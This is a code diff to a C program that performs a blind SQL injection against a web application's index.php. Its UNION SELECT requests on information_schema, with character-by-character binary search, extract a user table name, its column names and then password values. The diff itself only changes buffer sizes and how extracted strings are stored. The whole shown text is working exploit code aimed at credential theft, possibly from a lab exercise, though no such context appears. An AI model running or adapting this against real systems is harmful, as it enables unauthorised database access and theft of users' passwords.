@@ -269,11 +269,10 @@ const char *url_map[96] = {
     "%7F"  // 0x7F DEL
 };
 
-void binary_search(char final_discovered_name[11], int sockfd, const char *req) {
+void binary_search(char discovered_name[31], int sockfd, const char *req) {
 #ifdef __MY_DEBUG__
     int count = 0;
 #endif
-    char discovered_name[33] = {0};
 
     for (int i = 0; i < 10; i++) {
     #ifdef __MY_DEBUG__
@@ -301,7 +300,6 @@ void binary_search(char final_discovered_name[11], int sockfd, const char *req) 
             break;
         }
         strcat(discovered_name, url_map[low]);
-        final_discovered_name[i] = (char) (low + 0x20);
     }
 #ifdef __MY_DEBUG__
     printf("number of queries is: %d\n",count);
@@ -313,7 +311,7 @@ int32_t main() {
 
     _connect(sockfd, WEB_ADDR, 80);
 
-    char table_name[11] = {0};
+    char table_name[33] = {0};
 
     const char *table_req = "GET /index.php?order_id=0%%20UNION%%20SELECT%%20table_name%%20FROM%%20information_schema.TABLES%%20WHERE%%20table_name%%20LIKE%%20%%27%%25usr%%25%%27%%20AND%%20table_name%%20LIKE%%20%%27%s%%25%%27%%20AND%%20SUBSTR(table_name,%i,1)<%%3d%%27%s%%27%%20LIMIT%%201;"
         " HTTP/1.1\r\n"
@@ -334,7 +332,7 @@ int32_t main() {
     strcat(id_buf, table_name);
     strcat(id_buf, id_req_end);
 
-    char id_name[11] = {0};
+    char id_name[33] = {0};
 
     binary_search(id_name, sockfd, id_buf);
 
@@ -348,7 +346,7 @@ int32_t main() {
     strcat(pwd_buf, table_name);
     strcat(pwd_buf, pwd_req_end);
 
-    char pwd_name[11] = {0};
+    char pwd_name[33] = {0};
 
     binary_search(pwd_name, sockfd, pwd_buf);
 
@@ -369,7 +367,7 @@ int32_t main() {
 
         strcat(password_buf, password_req_end);
 
-        char final_password[11] = {0};
+        char final_password[33] = {0};
 
         binary_search(final_password, sockfd, password_buf);
 
